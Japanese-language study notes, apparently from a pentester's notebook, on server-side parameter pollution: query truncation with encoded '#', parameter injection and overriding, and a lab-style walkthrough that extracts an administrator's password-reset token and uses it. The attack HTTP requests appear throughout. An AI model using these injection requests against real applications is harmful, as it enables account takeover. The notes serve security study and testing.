---
###### 下記説明の前提条件

- ユーザ名に基づいて他のユーザを検索できる脆弱なアプリケーション

- ユーザを検索するとき、ブラウザは次のようなリクエストを行う
```http
GET /userSearch?name=peter&back=/home
```

- ユーザ情報を取得するために、サーバは以下のリクエストで内部APIに問い合わせる：
```http
GET /users/search?name=peter&publicProfile=true
```

---
## クエリの文字の切り捨て

1. `#`をURLエンコードし、適当な文字列を付け加えて注入する(`#`=`%23`)
```http
username=administrator#hoge
```

2. レスポンスを観察して情報を探す
	- Error　→　切り捨て失敗（`#`のあとに注入した適当な文字列を認識することによるエラー）or 重要な情報公開
	- 正当なレスポンス　→ 後続のクエリストリング切り捨て成功
	
- 切捨てにより内部APIへのリクエストの条件を一部無視することが可能(`publicProfile=true`を無視)

---
## invalidパラメタの注入

1. `&`をURLエンコードし、適当なパラメタと適当な値を注入する(`&`=`%26`)
```http
username=administrator&x=y
```

2. レスポンスを観察して情報を探す
	- Error → 注入失敗 or 重要な情報公開
	- 注入成功&レスポンスに変化がない →アプリケーションによって無視された

---
## validパラメタの注入

1. [3. ドキュメントにない隠されたパラメタの発見](../3.%20ドキュメントにない隠されたパラメタの発見.md)で有効なパラメタを発見する
2. `&`をURLエンコードして有効なパラメタと適当な値を注入する
```http
%26[valid_param]=foo
```

3. レスポンスを確認

## 既に存在するパラメタの上書き

1. 同じ名前のパラメタと異なる値を注入する
```http
%26[existed_param]=[value]
```

- 例
```http
GET /userSearch?name=peter%26name=carlos&back=/home
```

- サーバ → 内部API
```http
GET /users/search?name=peter&name=carlos&publicProfile=true
```

2. レスポンスを確認する

- 使用するテクノロジーにより解釈が異なる
	- PHP : 最後のパラメタのみ。上記例だと`carlos`を検索
	- Node.js: 最初のパラメタのみ。上記例だと`peter`を検索＝何も変わらない
	- ASP.net: 同じパラメタは結合する。上記例だと`peter,carlos` -> Error : Invalid 

3. レスポンスの結果を参考に、悪用する
```http
GET /userSearch?name=peter%26name=administrator&back=/home
```

## Server-side parameter pollution

1. パスワードリセット機能を試し、指定した`username`を`administrator`に変更してもエラーがないことを確認する
2. [2. クエリとして内部APIへ送信するストリングのテスト](2.%20クエリとして内部APIへ送信するストリングのテスト.md#クエリの文字の切り捨て)で有効なフィールド名(`field`)を割り出す
```http
username=administrator#hoge
```
3. `field`に値を付与してリクエスト。(⚠️後から追加した`&`や`#`は必ずurlエンコードする)
```http
username=administrator%26field=x%23
```
- Error: "Invalid field"を確認。つまり注入成功

4. `field`の正当な値をIntruder -> Simple list -> Add from list -> Server-side variable namesでbrute-forceする
```http
username=administrator%26field=§x§%23
```
- `email` と`username`パラメタを検出する

5. `email`パラメタを注入して正常なリクエストに対するレスポンスと同じものが返ることを確認する
```http
username=administrator%26field=email%23
```
- このことから正当なパラメタなら、注入しても拒絶されないことがわかる

6. 怪しげなJSファイル(`/static/js/forgotPassword.js`)を確認し、その中で`reset_token`パラメタを確認する。
```js
   const resetToken = urlParams.get('reset-token');
    if (resetToken)
    {
        window.location.href = `/forgot-password?reset_token=${resetToken}`;
    }
    else
```

7. `reset_token`パラメタを注入してリクエスト
```http
username=administrator%26field=reset_token%23
```
	↓レスポンス
```js
{"type":"reset_token","result":"nmb43t9pzlvuv781jlvu8dxae05wdhbs"}
```

8. 入手したトークンを、ステップ6で確認したJSファイルで指定された適切な方法で使用してパスワードリセットする
```http
GET /forgot-password?reset_token=nmb43t9pzlvuv781jlvu8dxae05wdhbs
```
